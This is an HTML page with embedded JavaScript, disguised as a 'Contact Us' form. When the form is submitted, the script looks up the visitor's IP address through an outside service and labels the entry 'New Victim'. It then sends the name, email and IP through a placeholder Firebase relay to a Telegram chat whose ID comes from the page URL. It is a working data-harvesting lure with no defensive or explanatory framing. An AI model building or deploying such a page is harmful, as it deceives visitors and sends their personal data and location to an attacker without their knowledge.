<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send Form Data to Telegram</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
    }
    
    .container {
      max-width: 600px;
      margin: 50px auto;
      padding: 20px;
      background-color: white;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    h1 {
      text-align: center;
      color: #333;
    }

    label {
      font-size: 14px;
      color: #555;
    }

    input[type="text"], input[type="email"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Contact Us</h1>
    <form id="userForm">
      <label for="name">Name:</label>
      <input type="text" id="name" name="name" required><br><br>
      <label for="email">Email:</label>
      <input type="email" id="email" name="email" required><br><br>
      <button type="submit">Submit</button>
    </form>
  </div>

  <script>
    // Function to get query parameters from the URL
    function getQueryParam(param) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(param);
    }

    // Fetch the 'chat_id' from the URL query string
    const chatId = getQueryParam('chat_id');  // Get chat_id from URL

    // If 'chat_id' is missing, alert the user and stop the form submission
    if (!chatId) {
      alert("Chat ID is missing in the URL.");
      document.getElementById("userForm").style.display = 'none';  // Hide the form if no chat_id
      throw new Error("Chat ID is missing in the URL.");  // Stop script execution if chat_id is missing
    }

    // Form submission event
    document.getElementById("userForm").addEventListener("submit", function(event) {
      event.preventDefault();

      const name = document.getElementById("name").value;
      const email = document.getElementById("email").value;

      // Fetch user IP address
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const userIP = data.ip;

          // Format the message to send to Telegram
          const message = `New Victim:\nName: ${name}\nEmail: ${email}\nIP Address: ${userIP}`;

          // Send the data to the proxy server (Firebase function)
          fetch('https://your-firebase-function-url/sendToTelegram', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: chatId,   // Chat ID for the target user/group
              message: message   // The message you want to send
            })
          })
          .then(response => response.json())
          .then(data => {
            alert("Message sent to Telegram!");
          })
          .catch(error => {
            alert("Error sending message.");
            console.error("Error:", error);
          });
        })
        .catch(error => {
          alert("Error fetching user IP.");
          console.error("Error:", error);
        });
    });
  </script>
</body>
</html>
